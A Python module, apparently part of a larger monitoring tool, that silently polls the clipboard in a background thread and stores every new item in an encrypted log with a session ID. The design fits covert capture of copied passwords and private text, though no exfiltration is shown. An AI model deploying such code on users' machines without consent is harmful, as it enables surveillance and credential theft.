import threading
import time
import json
from datetime import datetime
from collections import deque

try:
    import pyperclip
    PYPERCLIP_AVAILABLE = True
except ImportError:
    PYPERCLIP_AVAILABLE = False

from config.settings import (
    CLIPBOARD_ENABLED,
    CLIPBOARD_POLL_INTERVAL,
    CLIPBOARD_LOG_FILE,
    SESSION_ID,
)
from utils.encryption import EncryptionManager

class ClipboardMonitor:

    def __init__(self, encryption_manager: EncryptionManager = None):
        self.crypto = encryption_manager or EncryptionManager()
        self.enabled = CLIPBOARD_ENABLED and PYPERCLIP_AVAILABLE
        self.poll_interval = CLIPBOARD_POLL_INTERVAL
        self.log_file = CLIPBOARD_LOG_FILE

        self._running = False
        self._thread = None
        self._last_content = ""
        self._entries = deque(maxlen=500)
        self.total_captures = 0

        self._on_capture_callback = None

    def set_capture_callback(self, callback):
        self._on_capture_callback = callback

    def start(self):
        if not self.enabled:
            return

        if self._running:
            return

        self._running = True

        try:
            self._last_content = pyperclip.paste() or ""
        except Exception:
            self._last_content = ""

        self._thread = threading.Thread(
            target=self._monitor_loop,
            name="ClipboardMonitor",
            daemon=True,
        )
        self._thread.start()

    def stop(self):
        self._running = False
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=5)

    def _monitor_loop(self):
        while self._running:
            try:
                current = pyperclip.paste()

                if current and current != self._last_content:
                    self._handle_new_content(current)
                    self._last_content = current

            except Exception:
                pass

            time.sleep(self.poll_interval)

    def _handle_new_content(self, content: str):
        timestamp = datetime.now().isoformat()

        entry = {
            "timestamp": timestamp,
            "content": content[:1000],
            "length": len(content),
            "session_id": SESSION_ID,
        }

        self._entries.append(entry)
        self.total_captures += 1

        self._write_entry(entry)

        if self._on_capture_callback:
            try:
                self._on_capture_callback(entry)
            except Exception:
                pass

    def _write_entry(self, entry: dict):
        try:
            encrypted = self.crypto.encrypt(json.dumps(entry))
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(encrypted + "\n")
        except Exception:
            pass

    def get_recent_entries(self, count: int = 20) -> list:
        entries = list(self._entries)
        return entries[-count:]

    def get_stats(self) -> dict:
        return {
            "enabled": self.enabled,
            "running": self._running,
            "total_captures": self.total_captures,
            "poll_interval": self.poll_interval,
            "pyperclip_available": PYPERCLIP_AVAILABLE,
        }

    @property
    def is_running(self) -> bool:
        return self._running
